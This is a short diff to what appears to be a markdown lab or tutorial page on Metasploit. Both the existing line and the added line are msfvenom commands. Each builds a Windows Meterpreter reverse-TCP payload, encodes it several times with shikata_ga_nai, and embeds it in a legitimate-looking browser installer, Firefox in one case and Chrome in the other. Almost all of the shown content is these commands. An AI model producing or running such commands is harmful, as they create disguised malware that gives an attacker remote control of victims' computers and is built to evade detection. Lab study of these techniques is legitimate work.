@@ -264,5 +264,6 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=3000 -f e
 ````bash
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=3000 -f exe -e x86/shikata_ga_nai -i 10 -k -x /root/FirefoxSetup.exe -o /home/kali/Desktop/firefox_setup.exe
 ````
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=9000 -f exe -e x86/shikata_ga_nai -i 5 -k -x  /root/ChromeSetup.exe -o /home/kali/Desktop/chrome_setup.exe
 
 <img width="1392" height="733" alt="image" src="https://github.com/user-attachments/assets/8f901a2e-b4c9-4794-b8e1-8bd1ea27088a" />
